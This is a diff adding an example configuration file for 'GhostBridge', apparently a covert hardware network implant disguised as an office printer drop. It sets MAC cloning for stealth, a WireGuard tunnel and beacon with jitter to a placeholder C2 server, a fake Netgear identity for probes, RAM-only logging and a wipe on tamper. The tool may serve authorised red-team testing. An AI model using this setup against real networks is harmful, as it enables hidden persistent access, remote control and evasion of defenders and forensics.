@@ -1,0 +1,40 @@
+# GhostBridge Configuration Example
+# Copy to /etc/ghostbridge/config.yml and customize
+
+device:
+  id: "ghost-001"
+  name: "Office Printer Drop"
+
+network:
+  bridge_name: "br0"
+  wan_interface: "eth0"    # To wall port / switch
+  lan_interface: "eth1"    # To target device
+  clone_mac: true          # Clone target MAC to WAN (stealth)
+
+tunnel:
+  type: "wireguard"
+  interface: "wg0"
+  endpoint: "your-c2-server.com:51820"
+  keepalive: 25
+  reconnect_delays: [5, 10, 30, 60, 300]
+
+beacon:
+  enabled: true
+  interval: 300            # 5 minutes
+  jitter: 60               # ±1 minute random
+
+c2:
+  api_endpoint: "http://10.66.66.1:8082/api/ghostbridge"
+  timeout: 30
+  verify_ssl: true
+
+stealth:
+  ramfs_logs: true         # Keep logs in RAM only
+  fake_identity: "Netgear GS105"  # Response to probes
+  panic_on_tamper: true    # Wipe on tamper detection
+
+logging:
+  level: "WARNING"         # Minimal logging
+  to_disk: false           # Never log to disk
+  max_lines: 1000          # Max log lines in memory
+
